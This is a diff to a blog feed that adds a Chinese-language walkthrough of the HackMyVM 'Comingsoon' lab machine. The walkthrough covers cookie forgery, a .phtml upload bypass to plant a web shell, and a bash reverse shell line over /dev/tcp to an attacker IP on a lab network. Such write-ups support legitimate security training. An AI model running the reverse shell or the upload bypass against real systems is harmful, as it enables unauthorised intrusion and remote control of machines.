@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Hackmyvm - Comingsoon WriteUp</title>
+      <link href="/posts/48584345/"/>
+      <url>/posts/48584345/</url>
+      
+        <content type="html"><![CDATA[<p><strong>Machines Name：</strong>Hackmyvm - Comingsoon</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn 192.168.56.13 </span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331134752951.png" alt="image-20220331134752951"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135038292.png" alt="image-20220331135038292"></p><p>目录扫描无果</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135110783.png" alt="image-20220331135110783"></p><h2 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h2><p>burp抓包分析，发现cookie有点奇怪</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135236267.png" alt="image-20220331135236267"></p><p>base64解码</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135412963.png" alt="image-20220331135412963"></p><p>好像是一个启用upload的一个功能，构造cookie发包</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135531973.png" alt="image-20220331135531973"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135643271.png" alt="image-20220331135643271"></p><h2 id="phtml文件上传getshell"><a href="#phtml文件上传getshell" class="headerlink" title="phtml文件上传getshell"></a>phtml文件上传getshell</h2><p>首页多出一个upload按钮</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135700007.png" alt="image-20220331135700007"></p><p>点击UPLOAD跳转到上传文件页面</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135822682.png" alt="image-20220331135822682"></p><p>上传.php后缀提示不允许上传</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331135935113.png" alt="image-20220331135935113"></p><p>.phtml后缀成功上传,并返回路径&#x2F;assets&#x2F;img</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331140237262.png" alt="image-20220331140237262"></p><p>冰蝎连接</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331140720932.png" alt="image-20220331140720932"></p><h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.56.8/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141033749.png" alt="image-20220331141033749"></p><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>提权工具一把嗦</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141340364.png" alt="image-20220331141340364"></p><h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331141411332.png" alt="image-20220331141411332"></p><h2 id="机器预设方法提权"><a href="#机器预设方法提权" class="headerlink" title="机器预设方法提权"></a>机器预设方法提权</h2><p>有点难搞，不做演示，有摩托车还要什么自行车！</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Hackmyvm Machines </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hackmyvm - University WriteUp</title>
       <link href="/posts/877236973/"/>
       <url>/posts/877236973/</url>
